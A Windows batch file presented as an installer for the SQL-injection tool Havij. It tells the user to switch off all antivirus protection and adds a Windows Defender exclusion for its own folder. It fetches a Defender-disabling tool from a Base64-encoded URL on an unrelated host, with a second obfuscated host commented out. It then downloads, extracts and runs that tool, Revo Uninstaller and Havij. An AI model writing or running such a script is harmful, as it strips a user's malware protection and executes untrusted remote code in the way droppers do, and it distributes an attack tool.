@echo off
Title Arena Havij Installer

:: Get the current script path
set "SCRIPT_PATH=%~dp0"

echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo 	Havij Installer by Arena Web Security
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo.
echo Turn off every Virus and Threat Protection
echo.

set tCommand=
for /f "tokens=*" %%i in ('echo %ProgramFiles%\Windows Defender\MSASCui.exe') do set tCommand=%%i
if not exist "%tCommand%" set tCommand=windowsdefender://Threatsettings
start "" "%tCommand%"


powershell -Command "Add-MpPreference -ExclusionPath \"%SCRIPT_PATH%\""

cd /d "%SCRIPT_PATH%"

:: Option to download Revo Uninstaller Pro
echo.
echo Do You Want To Download Revo Uninstaller Pro? (Y/N)
set /p "revoChoice=Type Y to download or any key to skip: "
if /I "%revoChoice%"=="Y" (
    powershell -Command "Invoke-WebRequest -Uri https://f3b1cfc5d488c0384dc3-056ccca39cd416ca6db85fa26f78b9ef.ssl.cf1.rackcdn.com/RevoUninstaller_Portable.zip -OutFile .\Revo_Uninstaller_Pro.zip"
    echo Revo Uninstaller Pro downloaded successfully.
) else (
    echo Skipping Revo Uninstaller Pro download.
)

tar -xf "%SCRIPT_PATH%\Revo_Uninstaller_Pro.zip"

pause

echo.
echo Starting Revo_Uninstaller_Pro
echo.

"%SCRIPT_PATH%\RevoUninstaller_Portable\RevoUPort.exe"

pause

echo.
echo Do You Want To Download dControl?
echo.

pause

:: Download DefenderControl
powershell -Command "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9paWppc2VtLmNvbS91cGxvYWRzL2RDb250cm9sLnppcA==')); Invoke-WebRequest -Uri $u -OutFile .\Defender_Control.zip
::powershell -Command "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly90ZXN0NC5ib29rLXBob3Rvcy1wcm8uY29tL2RDb250cm9sLnppcA==')); Invoke-WebRequest -Uri $u -OutFile .\Defender_Control.zip"
::powershell -Command "Invoke-WebRequest -Uri arenawebsecurity.net/dControl.zip -OutFile .\Defender_Control.zip"
::powershell -Command "Invoke-WebRequest https://www.sordum.org/files/downloads.php?st-defender-control -OutFile .\Defender_Control.zip"
:: do not harm any site please!
:: Extract the Defender_Control.zip file
:: tar -xf "%SCRIPT_PATH%\Defender_Control.zip"


echo.
echo.
echo Please Enter passphrase "sordum" to continue.
echo.
echo.

:: Extract the Defender_Control.zip file
tar -xf "%SCRIPT_PATH%\Defender_Control.zip"

pause

echo.
echo Starting dControl
echo.

"%SCRIPT_PATH%\dControl\dControl.exe"

pause

echo.
echo Starting dControl
echo.

echo.
echo Do You Want To Download Havij?
echo.

pause

:: Download Havij
powershell -Command "Invoke-WebRequest https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip -OutFile .\Havij_1.12_Free.zip"

echo.
echo.
echo Please Enter passphrase "darknet123" to continue.
echo.
echo.

:: Extract the Havij_1.12_Free.zip file
tar -xf "%SCRIPT_PATH%\Havij_1.12_Free.zip"


"%SCRIPT_PATH%\Havij 1.12 Free.exe"

pause

:: Optionally, change the directory back to the original path
cd /d "%~dp0"
